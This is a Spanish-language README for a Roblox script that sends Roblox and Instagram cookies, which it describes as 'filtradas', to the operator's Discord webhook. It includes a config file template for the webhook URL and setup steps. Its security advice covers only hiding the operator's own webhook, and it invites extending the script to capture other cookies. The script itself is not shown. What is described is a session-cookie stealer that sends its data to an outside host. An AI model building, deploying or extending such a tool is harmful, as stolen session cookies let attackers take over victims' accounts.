# Roblox Discord Webhook Notifier

Este proyecto permite enviar notificaciones y cookies filtradas (Roblox/Instagram) a un canal de Discord usando un webhook, desde un script de Roblox.

## Archivos principales
- `rblx.lua` — Script principal (no contiene datos sensibles)
- `config.lua` — Archivo de configuración (NO se sube a GitHub)
- `.gitignore` — Asegura que `config.lua` no se suba

## Instalación y uso

1. **Clona este repositorio**
2. **Crea tu propio archivo `config.lua` en la raíz del proyecto:**

```lua
local config = {}
config.WEBHOOK_URL = "https://discord.com/api/webhooks/tu_webhook_aqui"
return config
```

3. **Configura tu webhook real de Discord en `config.lua`**
4. **Asegúrate de que `.gitignore` contiene la línea:**
```
config.lua
```
5. **Coloca el script en tu entorno de Roblox Studio y habilita HTTP Requests**
6. **Ejecuta el juego y revisa tu canal de Discord para ver las notificaciones**

## Seguridad
- **Nunca subas tu `config.lua` ni tu webhook real a GitHub.**
- Si accidentalmente lo subiste, elimina el archivo del repo y cambia el webhook en Discord.

## Personalización
- Puedes modificar el script para filtrar otras cookies o cambiar el formato del mensaje.

---

¡Listo para usar y compartir de forma segura! 